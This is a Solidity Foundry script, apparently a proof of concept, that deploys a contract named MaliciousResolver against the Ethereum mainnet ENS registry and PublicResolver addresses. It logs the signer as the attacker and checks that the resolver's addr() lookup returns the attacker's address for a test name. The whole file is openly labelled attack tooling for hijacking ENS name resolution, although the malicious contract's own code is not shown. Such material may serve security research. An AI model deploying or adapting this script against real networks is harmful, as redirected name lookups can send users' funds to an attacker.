// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "../contracts/MaliciousResolver.sol";

contract DeployMaliciousResolver is Script {
    // Mainnet addresses
    address constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(deployerPrivateKey);
        
        console.log("=== DEPLOYING MALICIOUS RESOLVERS ===");
        console.log("Deployer/Attacker:", attacker);
        console.log("ENS Registry:", MAINNET_ENS);
        console.log("PublicResolver:", MAINNET_PUBLIC_RESOLVER);
        
        // Fund the deployer account on the fork
        vm.deal(attacker, 10 ether);
        console.log("Deployer balance:", attacker.balance);
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy basic malicious resolver
        console.log("\n--- Deploying Basic MaliciousResolver ---");
        MaliciousResolver resolver = new MaliciousResolver(
            attacker,
            address(0), // Use mainnet ENS
            address(0)  // Use mainnet PublicResolver
        );
        console.log("MaliciousResolver deployed at:", address(resolver));
        
        // Verify deployment
        console.log("\n=== VERIFICATION ===");
        console.log("ENS:", address(resolver.ens()));
        console.log("PublicResolver:", address(resolver.publicResolver()));
        console.log("Attacker:", resolver.attacker());
        
        // Test the attack
        console.log("\n=== TESTING ATTACK ===");
        bytes32 testNode = keccak256(abi.encodePacked(
            bytes32(0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae), // eth node
            keccak256("test")
        ));
        
        // Test resolver
        address result = resolver.addr(testNode);
        console.log("Resolver addr() returns:", result);
        console.log("Expected attacker address:", attacker);
        require(result == attacker, "Resolver attack failed!");
        
        console.log("\n=== DEPLOYMENT SUCCESSFUL ===");
        console.log("Resolver deployed and tested successfully!");
        
        vm.stopBroadcast();
    }
}
